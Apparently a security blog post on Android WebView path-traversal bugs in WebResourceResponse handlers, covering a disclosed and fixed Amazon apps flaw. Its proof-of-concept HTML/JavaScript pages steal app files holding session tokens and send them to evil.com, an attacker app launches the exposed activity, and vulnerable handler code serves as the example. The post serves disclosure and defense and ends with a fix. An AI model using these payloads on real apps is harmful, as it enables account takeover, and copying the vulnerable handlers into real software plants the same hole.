> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.oversecured.com](https://blog.oversecured.com/Android-Exploring-vulnerabilities-in-WebResourceResponse/)

> When it comes to vulnerabilities in WebViews, we often overlook the incorrect implementation of

When it comes to vulnerabilities in WebViews, we often overlook the incorrect implementation of `WebResourceResponse` which is a WebView class that allows an Android app to emulate the server by returning a response (including a status code, content type, content encoding, headers and the response body) from the app’s code itself without making any actual requests to the server. At the end of the article, we’ll show how we exploited a vulnerability related to this in Amazon apps.

If you’re a developer, you can integrate Oversecured into your CI/CD to proactively secure your apps against these vulnerabilities. We have solutions that monitor apps continuously and alert you if any new vulnerabilities are detected. [Contact us](https://oversecured.com/contact-us) to learn more and get a demo.

If you’re a security researcher, you can automate the process by using Oversecured’s mobile app scanner to scan for these bugs. All you have to do is [sign up](https://oversecured.com/sign-up) and upload your app’s files. Our scanner will take care of the rest.

[](#what-is-webresourceresponse)[What is `WebResourceResponse`?](#what-is-webresourceresponse)

The WebView class in Android is used for displaying web content within an app, and provides extensive capabilities for manipulating requests and responses. It is a fancy web browser that allows developers, among other things, to bypass standard browser security. Any misuse of these features by a malicious actor can lead to vulnerabilities in mobile apps.

One of these features is that a WebView allows you to intercept app requests and return arbitrary content, which is implemented via the `WebResourceResponse` class.

Let’s look at a typical example of a `WebResourceResponse` implementation:

```
WebView webView = findViewById(R.id.webView);
webView.setWebViewClient(new WebViewClient() {
   public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
       Uri uri = request.getUrl();
       if (uri.getPath().startsWith("/local_cache/")) {
           File cacheFile = new File(getCacheDir(), uri.getLastPathSegment());
           if (cacheFile.exists()) {
               InputStream inputStream;
               try {
                   inputStream = new FileInputStream(cacheFile);
               } catch (IOException e) {
                   return null;
               }
               Map<String, String> headers = new HashMap<>();
               headers.put("Access-Control-Allow-Origin", "*");
               return new WebResourceResponse("text/html", "utf-8", 200, "OK", headers, inputStream);
           }
       }
       return super.shouldInterceptRequest(view, request);
   }
});


```

As you can see in the code above, if the request URI matches a given pattern, then the response is returned from the app resources or local files. The problem arises when an attacker can manipulate the path of the returned file and, through XHR requests, gain access to arbitrary files.

Therefore, if an attacker discovers a simple XSS or the ability to open arbitrary links inside the Android app, they can use that to leak sensitive user data – which can also include the access token, leading to a full account takeover.

[](#proof-of-concept-for-an-attack)[Proof of Concept for an attack](#proof-of-concept-for-an-attack)

If you already have the ability to execute arbitrary JavaScript code inside a vulnerable WebView, and assuming there is some sensitive data in `/data/data/com.victim/shared_prefs/auth.xml`, then the Proof of Concept for the attack will look like this:

```
<!DOCTYPE html>
<html>
<head>
   <title>Evil page</title>
</head>
<body>
<script type="text/javascript">
   function theftFile(path, callback) {
     var oReq = new XMLHttpRequest();

     oReq.open("GET", "https://any.domain/local_cache/..%2F" + encodeURIComponent(path), true);
     oReq.onload = function(e) {
       callback(oReq.responseText);
     }
     oReq.onerror = function(e) {
       callback(null);
     }
     oReq.send();
   }

   theftFile("shared_prefs/auth.xml", function(contents) {
       location.href = "https://evil.com/?data=" + encodeURIComponent(contents);
   });
</script>
</body>
</html>


```

It should be noted that the attack works because `new File(getCacheDir(), uri.getLastPathSegment())` is being used to generate the path and the method `Uri.getLastPathSegment()` returns a decoded value.

However, policies like CORS still work inside a WebView. Therefore, if `Access-Control-Allow-Origin: *` is not specified in the headers, then requests to the current domain will not be allowed. In our example, this restriction will not affect the exploitation of path traversal, because `any.domain` can be replaced with the current scheme + host + port.

[](#an-overview-of-the-vulnerability-in-amazon’s-apps)[An overview of the vulnerability in Amazon’s apps](#an-overview-of-the-vulnerability-in-amazon’s-apps)

We scanned the Amazon Shopping and Amazon India Online Shopping apps and found two vulnerabilities. They were chained to access arbitrary files owned by Amazon apps and then reported to the Amazon VRP on December 21st, 2019. The issues were confirmed fixed by Amazon on April 6th, 2020.

*   The first was opening arbitrary URLs within the WebView through the `com.amazon.mShop.pushnotification.WebNotificationsSettingsActivity` activity:

![](https://blog.oversecured.com/assets/images/amazon_url.png)

– and the second was stealing arbitrary files via `WebResourceResponse` in the `com/amazon/mobile/mash/MASHWebViewClient.java` file:

![](https://blog.oversecured.com/assets/images/amazon_client.png)

Two checks take place in the `com/amazon/mobile/mash/handlers/LocalAssetHandler.java` file:

One is in the `shouldHandlePackage` method:

```
   public boolean shouldHandlePackage(UrlWebviewPackage pkg) {
       return pkg.getUrl().startsWith("https://app.local/");
   }


```

And the second is in the `handlePackage` handler:

```
   public WebResourceResponse handlePackage(UrlWebviewPackage pkg) {
       InputStream stm;
       Uri uri = Uri.parse(pkg.getUrl());
       String path = uri.getPath().substring(1);
       try {
           if (path.startsWith("assets/")) {
               stm = pkg.getWebView().getContext().getResources().getAssets().open(path.substring("assets/".length()));
           } else if (path.startsWith("files/")) {
               stm = new FileInputStream(path.substring("files/".length())); // path to an arbitrary file
           } else {
               MASHLog.m2345v(TAG, "Unexpected path " + path);
               stm = null;
           }
           //...
           Map<String, String> headers = new HashMap<>();
           headers.put("Cache-Control", "max-age=31556926");
           headers.put("Access-Control-Allow-Origin", "*");
           return new WebResourceResponse(mimeType, null, 200, "OK", headers, stm);
       } catch (IOException e) {
           MASHLog.m2346v(TAG, "Failed to load resource " + uri, e);
           return null;
       }
   }


```

[](#proof-of-concept-for-amazon)[Proof of Concept for Amazon](#proof-of-concept-for-amazon)

Keeping the above-mentioned vulnerabilities and checks in mind, the attacker’s app looked like this:

```
   String file = "/sdcard/evil.html";
   try {
       InputStream i = getAssets().open("evil.html");
       OutputStream o = new FileOutputStream(file);
       IOUtils.copy(i, o);
       i.close();
       o.close();
   } catch (Exception e) {
       throw new RuntimeException(e);
   }

   Intent intent = new Intent();
   intent.setClassName("in.amazon.mShop.android.shopping", "com.amazon.mShop.pushnotification.WebNotificationsSettingsActivity");
   intent.putExtra("MASHWEBVIEW_URL", "file://www.amazon.in" + file + "#/data/data/in.amazon.mShop.android.shopping/shared_prefs/DataStore.xml");
   startActivity(intent);


```

The apps also had a host check that was bypassed by us. This check could also be bypassed using the `javascript:` scheme which removed any requirements to have SD card permissions for making a file.

The file `evil.html` contained the exploit code:

```
<!DOCTYPE html>
<html>
<head>
   <title>Evil</title>
</head>
<body>
<script type="text/javascript">
   function theftFile(path, callback) {
     var oReq = new XMLHttpRequest();

     oReq.open("GET", "https://app.local/files/" + path, true);
     oReq.onload = function(e) {
       callback(oReq.responseText);
     }
     oReq.onerror = function(e) {
       callback(null);
     }
     oReq.send();
   }

   theftFile(location.hash.substring(1), function(contents) {
       location.href = "https://evil.com/?data=" + encodeURIComponent(contents);
   });
</script>
</body>
</html>


```

As a result, on opening the attacker’s app, the `DataStore.xml` file containing the user’s session token was sent to the attacker’s server.

[](#how-to-prevent-this-vulnerability)[How to prevent this vulnerability](#how-to-prevent-this-vulnerability)

While implementing `WebResourceResponse`, it is recommended to use [`WebViewAssetLoader`](https://developer.android.com/reference/androidx/webkit/WebViewAssetLoader), which is a user-friendly interface. It allows the app to safely process data from resources, assets or a predefined directory.

It can be extremely helpful to detect this bug early. Oversecured’s mobile app scanner lets users do that, and notifies them in the scan report about all the vectors mentioned above. [Contact us](https://oversecured.com/contact-us), and we can provide you with a demo to try it out.